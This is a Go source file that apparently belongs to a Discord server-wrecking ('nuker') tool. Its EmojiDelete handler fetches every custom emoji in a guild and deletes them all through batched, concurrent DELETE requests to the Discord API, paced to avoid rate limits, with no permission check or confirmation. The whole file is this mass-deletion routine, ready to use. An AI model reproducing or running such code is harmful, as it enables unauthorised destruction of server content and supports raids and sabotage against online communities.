package removing

import (
	"Athanatos/core/requests"
	"encoding/json"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
)

func EmojiDelete(s *discordgo.Session, m *discordgo.MessageCreate) {
	emojis, _ := s.GuildEmojis(m.GuildID)
	smoothed := requests.Smooth(emojis)

	for _, ch := range smoothed {
		wg := new(sync.WaitGroup)
		wg.Add(len(ch))
		for _, emoji := range ch {
			go func(emoji *discordgo.Emoji) {
				defer wg.Done()

				emojid := emoji.ID

				data := []byte{}
				jsonData, _ := json.Marshal(data)

				requests.Sendhttp("https://discord.com/api/v9/guilds/"+m.GuildID+"/emojis/"+emojid, "DELETE", jsonData)
			}(emoji)
		}
		wg.Wait()
		time.Sleep(time.Second)
	}
}
